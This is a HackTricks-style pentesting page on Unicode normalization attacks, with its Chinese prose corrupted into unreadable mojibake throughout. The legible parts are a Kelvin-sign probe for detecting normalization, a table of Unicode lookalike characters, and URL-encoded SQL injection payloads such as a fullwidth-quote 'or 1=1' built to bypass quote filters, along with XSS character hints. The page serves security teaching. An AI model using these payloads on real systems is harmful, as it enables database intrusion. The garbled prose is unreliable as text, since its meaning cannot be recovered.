# Unicodeè§„èŒƒåŒ–

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWSçº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ–åœ¨**Twitter**ä¸Šå…³æ³¨æˆ‘ ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

**è¿™æ˜¯ä¸€ä¸ªæ‘˜è¦ï¼š[https://appcheck-ng.com/unicode-normalization-vulnerabilities-the-special-k-polyglot/](https://appcheck-ng.com/unicode-normalization-vulnerabilities-the-special-k-polyglot/)**ã€‚æŸ¥çœ‹æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼ˆå›¾ç‰‡å–è‡ªè¯¥ç½‘ç«™ï¼‰ã€‚

## ç†è§£Unicodeå’Œè§„èŒƒåŒ–

Unicodeè§„èŒƒåŒ–æ˜¯ä¸€ç§ç¡®ä¿å­—ç¬¦çš„ä¸åŒäºŒè¿›åˆ¶è¡¨ç¤ºæ ‡å‡†åŒ–ä¸ºç›¸åŒäºŒè¿›åˆ¶å€¼çš„è¿‡ç¨‹ã€‚è¿™ä¸ªè¿‡ç¨‹åœ¨å¤„ç†ç¼–ç¨‹å’Œæ•°æ®å¤„ç†ä¸­çš„å­—ç¬¦ä¸²æ—¶è‡³å…³é‡è¦ã€‚Unicodeæ ‡å‡†å®šä¹‰äº†ä¸¤ç§å­—ç¬¦ç­‰ä»·æ€§ï¼š

1. **è§„èŒƒç­‰ä»·æ€§**ï¼šå¦‚æœå­—ç¬¦åœ¨æ‰“å°æˆ–æ˜¾ç¤ºæ—¶å…·æœ‰ç›¸åŒçš„å¤–è§‚å’Œå«ä¹‰ï¼Œåˆ™è¢«è§†ä¸ºè§„èŒƒç­‰ä»·ã€‚
2. **å…¼å®¹ç­‰ä»·æ€§**ï¼šä¸€ç§è¾ƒå¼±çš„ç­‰ä»·å½¢å¼ï¼Œå…¶ä¸­å­—ç¬¦å¯èƒ½è¡¨ç¤ºç›¸åŒçš„æŠ½è±¡å­—ç¬¦ï¼Œä½†æ˜¾ç¤ºæ–¹å¼å¯èƒ½ä¸åŒã€‚

æœ‰**å››ç§Unicodeè§„èŒƒåŒ–ç®—æ³•**ï¼šNFCã€NFDã€NFKCå’ŒNFKDã€‚æ¯ç§ç®—æ³•ä»¥ä¸åŒæ–¹å¼åº”ç”¨è§„èŒƒå’Œå…¼å®¹è§„èŒƒåŒ–æŠ€æœ¯ã€‚è¦æ›´æ·±å…¥åœ°äº†è§£è¿™äº›æŠ€æœ¯ï¼Œæ‚¨å¯ä»¥åœ¨[Unicode.org](https://unicode.org/)ä¸Šæ¢ç´¢è¿™äº›æŠ€æœ¯ã€‚

### Unicodeç¼–ç çš„å…³é”®è¦ç‚¹

ç†è§£Unicodeç¼–ç è‡³å…³é‡è¦ï¼Œç‰¹åˆ«æ˜¯åœ¨å¤„ç†ä¸åŒç³»ç»Ÿæˆ–è¯­è¨€ä¹‹é—´çš„äº’æ“ä½œæ€§é—®é¢˜æ—¶ã€‚ä»¥ä¸‹æ˜¯ä¸»è¦è¦ç‚¹ï¼š

- **ä»£ç ç‚¹å’Œå­—ç¬¦**ï¼šåœ¨Unicodeä¸­ï¼Œæ¯ä¸ªå­—ç¬¦æˆ–ç¬¦å·éƒ½è¢«åˆ†é…ä¸€ä¸ªç§°ä¸ºâ€œä»£ç ç‚¹â€çš„æ•°å€¼ã€‚
- **å­—èŠ‚è¡¨ç¤º**ï¼šä»£ç ç‚¹ï¼ˆæˆ–å­—ç¬¦ï¼‰åœ¨å†…å­˜ä¸­ç”±ä¸€ä¸ªæˆ–å¤šä¸ªå­—èŠ‚è¡¨ç¤ºã€‚ä¾‹å¦‚ï¼Œä½¿ç”¨ä¸€ä¸ªå­—èŠ‚è¡¨ç¤ºæ‹‰ä¸-1å­—ç¬¦ï¼ˆåœ¨è®²è‹±è¯­çš„å›½å®¶ä¸­å¾ˆå¸¸è§ï¼‰ã€‚ç„¶è€Œï¼Œå…·æœ‰æ›´å¤§å­—ç¬¦é›†çš„è¯­è¨€éœ€è¦æ›´å¤šå­—èŠ‚æ¥è¡¨ç¤ºã€‚
- **ç¼–ç **ï¼šè¿™ä¸ªæœ¯è¯­æŒ‡çš„æ˜¯å¦‚ä½•å°†å­—ç¬¦è½¬æ¢ä¸ºä¸€ç³»åˆ—å­—èŠ‚ã€‚UTF-8æ˜¯ä¸€ç§æµè¡Œçš„ç¼–ç æ ‡å‡†ï¼Œå…¶ä¸­ASCIIå­—ç¬¦ä½¿ç”¨ä¸€ä¸ªå­—èŠ‚è¡¨ç¤ºï¼Œå…¶ä»–å­—ç¬¦æœ€å¤šä½¿ç”¨å››ä¸ªå­—èŠ‚ã€‚
- **å¤„ç†æ•°æ®**ï¼šå¤„ç†æ•°æ®çš„ç³»ç»Ÿå¿…é¡»äº†è§£æ‰€ä½¿ç”¨çš„ç¼–ç ï¼Œä»¥æ­£ç¡®åœ°å°†å­—èŠ‚æµè½¬æ¢ä¸ºå­—ç¬¦ã€‚
- **UTFçš„å˜ä½“**ï¼šé™¤äº†UTF-8ï¼Œè¿˜æœ‰å…¶ä»–ç¼–ç æ ‡å‡†ï¼Œå¦‚UTF-16ï¼ˆä½¿ç”¨è‡³å°‘2ä¸ªå­—èŠ‚ï¼Œæœ€å¤š4ä¸ªï¼‰å’ŒUTF-32ï¼ˆæ‰€æœ‰å­—ç¬¦ä½¿ç”¨4ä¸ªå­—èŠ‚ï¼‰ã€‚

ç†è§£è¿™äº›æ¦‚å¿µå¯¹äºæœ‰æ•ˆå¤„ç†å’Œå‡è½»ç”±Unicodeçš„å¤æ‚æ€§åŠå…¶å„ç§ç¼–ç æ–¹æ³•å¼•èµ·çš„æ½œåœ¨é—®é¢˜è‡³å…³é‡è¦ã€‚
```python
unicodedata.normalize("NFKD","chloe\u0301") == unicodedata.normalize("NFKD", "chlo\u00e9")
```
**Unicodeç­‰æ•ˆå­—ç¬¦åˆ—è¡¨å¯åœ¨æ­¤æ‰¾åˆ°ï¼š** [https://appcheck-ng.com/wp-content/uploads/unicode\_normalization.html](https://appcheck-ng.com/wp-content/uploads/unicode\_normalization.html) å’Œ [https://0xacb.com/normalization\_table](https://0xacb.com/normalization\_table)

### æ¢ç´¢

å¦‚æœæ‚¨å¯ä»¥åœ¨webåº”ç”¨ç¨‹åºä¸­æ‰¾åˆ°ä¸€ä¸ªè¢«å›æ˜¾çš„å€¼ï¼Œæ‚¨å¯ä»¥å°è¯•å‘é€**â€œå¼€å°”æ–‡ç¬¦å·â€ï¼ˆU+0212Aï¼‰**ï¼Œå®ƒ**å½’ä¸€åŒ–ä¸ºâ€œKâ€**ï¼ˆæ‚¨å¯ä»¥å‘é€å®ƒä½œä¸º`%e2%84%aa`ï¼‰ã€‚**å¦‚æœå›æ˜¾äº†â€œKâ€**ï¼Œé‚£ä¹ˆå¯èƒ½æ­£åœ¨æ‰§è¡ŒæŸç§**Unicodeå½’ä¸€åŒ–**ã€‚

å¦ä¸€ä¸ª**ç¤ºä¾‹**ï¼š`%F0%9D%95%83%E2%85%87%F0%9D%99%A4%F0%9D%93%83%E2%85%88%F0%9D%94%B0%F0%9D%94%A5%F0%9D%99%96%F0%9D%93%83` ç»è¿‡**unicode**åä¸º `Leonishan`ã€‚

## **æ˜“å—æ”»å‡»çš„ç¤ºä¾‹**

### **SQLæ³¨å…¥è¿‡æ»¤å™¨ç»•è¿‡**

æƒ³è±¡ä¸€ä¸ªç½‘é¡µæ­£åœ¨ä½¿ç”¨å­—ç¬¦`'`æ¥ä½¿ç”¨ç”¨æˆ·è¾“å…¥åˆ›å»ºSQLæŸ¥è¯¢ã€‚è¿™ä¸ªç½‘é¡µä½œä¸ºå®‰å…¨æªæ–½ï¼Œ**åˆ é™¤**ç”¨æˆ·è¾“å…¥ä¸­æ‰€æœ‰å‡ºç°çš„å­—ç¬¦**`'`**ï¼Œä½†åœ¨**åˆ é™¤**ä¹‹åå’Œ**åˆ›å»º**æŸ¥è¯¢ä¹‹å‰ï¼Œå®ƒä½¿ç”¨**Unicode**å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œ**å½’ä¸€åŒ–**ã€‚

ç„¶åï¼Œæ¶æ„ç”¨æˆ·å¯ä»¥æ’å…¥ä¸€ä¸ªç­‰æ•ˆäº`' (0x27)`çš„ä¸åŒUnicodeå­—ç¬¦ï¼Œå¦‚`%ef%bc%87`ï¼Œå½“è¾“å…¥è¢«å½’ä¸€åŒ–æ—¶ï¼Œä¸€ä¸ªå•å¼•å·è¢«åˆ›å»ºï¼Œä»è€Œå‡ºç°**SQLæ³¨å…¥æ¼æ´**ï¼š

![https://appcheck-ng.com/unicode-normalization-vulnerabilities-the-special-k-polyglot/](<../../.gitbook/assets/image (157) (1).png>)

**ä¸€äº›æœ‰è¶£çš„Unicodeå­—ç¬¦**

* `o` -- %e1%b4%bc
* `r` -- %e1%b4%bf
* `1` -- %c2%b9
* `=` -- %e2%81%bc
* `/` -- %ef%bc%8f
* `-`-- %ef%b9%a3
* `#`-- %ef%b9%9f
* `*`-- %ef%b9%a1
* `'` -- %ef%bc%87
* `"` -- %ef%bc%82
* `|` -- %ef%bd%9c
```
' or 1=1-- -
%ef%bc%87+%e1%b4%bc%e1%b4%bf+%c2%b9%e2%81%bc%c2%b9%ef%b9%a3%ef%b9%a3+%ef%b9%a3

" or 1=1-- -
%ef%bc%82+%e1%b4%bc%e1%b4%bf+%c2%b9%e2%81%bc%c2%b9%ef%b9%a3%ef%b9%a3+%ef%b9%a3

' || 1==1//
%ef%bc%87+%ef%bd%9c%ef%bd%9c+%c2%b9%e2%81%bc%e2%81%bc%c2%b9%ef%bc%8f%ef%bc%8f

" || 1==1//
%ef%bc%82+%ef%bd%9c%ef%bd%9c+%c2%b9%e2%81%bc%e2%81%bc%c2%b9%ef%bc%8f%ef%bc%8f
```
#### sqlmap æ¨¡æ¿

{% embed url="https://github.com/carlospolop/sqlmap_to_unicode_template" %}

### XSSï¼ˆè·¨ç«™è„šæœ¬ï¼‰

æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å­—ç¬¦ä¹‹ä¸€æ¥æ¬ºéª— Web åº”ç”¨ç¨‹åºå¹¶åˆ©ç”¨ XSSï¼š

![https://appcheck-ng.com/unicode-normalization-vulnerabilities-the-special-k-polyglot/](<../../.gitbook/assets/image (312) (1).png>)

è¯·æ³¨æ„ï¼Œä¾‹å¦‚ï¼Œç¬¬ä¸€ä¸ªæå‡ºçš„ Unicode å­—ç¬¦å¯ä»¥å‘é€ä¸ºï¼š`%e2%89%ae` æˆ– `%u226e`

![https://appcheck-ng.com/unicode-normalization-vulnerabilities-the-special-k-polyglot/](<../../.gitbook/assets/image (215) (1).png>)

### æ¨¡ç³Šæ­£åˆ™è¡¨è¾¾å¼

å½“åç«¯**ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æ£€æŸ¥ç”¨æˆ·è¾“å…¥**æ—¶ï¼Œå¯èƒ½ä¼šå‡ºç°**è¾“å…¥**è¢«**è§„èŒƒåŒ–**ç”¨äº**æ­£åˆ™è¡¨è¾¾å¼**ï¼Œä½†**æœª**ç”¨äºå…¶**ä½¿ç”¨**çš„æƒ…å†µã€‚ä¾‹å¦‚ï¼Œåœ¨å¼€æ”¾é‡å®šå‘æˆ– SSRF ä¸­ï¼Œæ­£åˆ™è¡¨è¾¾å¼å¯èƒ½ä¼š**è§„èŒƒåŒ–å‘é€çš„ URL**ï¼Œä½†ç„¶å**æŒ‰åŸæ ·è®¿é—®**å®ƒã€‚

å·¥å…· [**recollapse**](https://github.com/0xacb/recollapse) å…è®¸**ç”Ÿæˆè¾“å…¥çš„å˜ä½“**ä»¥å¯¹åç«¯è¿›è¡Œæ¨¡ç³Šæµ‹è¯•ã€‚æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹**github**å’Œæ­¤[**æ–‡ç« **](https://0xacb.com/2022/11/21/recollapse/).


## å‚è€ƒèµ„æ–™
* [**https://labs.spotify.com/2013/06/18/creative-usernames/**](https://labs.spotify.com/2013/06/18/creative-usernames/)
* [**https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work**](https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work)
* [**https://jlajara.gitlab.io/posts/2020/02/19/Bypass\_WAF\_Unicode.html**](https://jlajara.gitlab.io/posts/2020/02/19/Bypass\_WAF\_Unicode.html)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS çº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½ PDF ç‰ˆæœ¬çš„ HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFT**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)** ä¸Šå…³æ³¨æˆ‘**ã€‚
* é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
